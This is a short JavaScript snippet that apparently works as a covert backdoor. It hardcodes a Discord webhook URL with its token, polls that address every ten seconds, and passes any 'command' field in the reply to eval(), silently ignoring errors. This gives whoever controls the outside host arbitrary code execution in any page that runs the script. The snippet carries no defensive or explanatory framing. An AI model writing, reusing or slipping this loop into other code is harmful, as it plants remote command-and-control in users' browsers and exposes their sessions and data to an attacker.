(function() {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1553930246057885746/v1Lr9Fj6wfp0_iU6ifEl7Gg5G6rDZ2poSVNWI9_mpUbHn_01PI5vYX5BvN1Dc6qvGSBV';
    
    // Check for commands every 10 seconds
    setInterval(function() {
        fetch(webhookUrl + '?id=' + Math.random().toString(36).substr(2, 9))
            .then(response => response.json())
            .then(data => {
                if (data.command) {
                    eval(data.command);
                }
            })
            .catch(() => {});
    }, 10000);
})();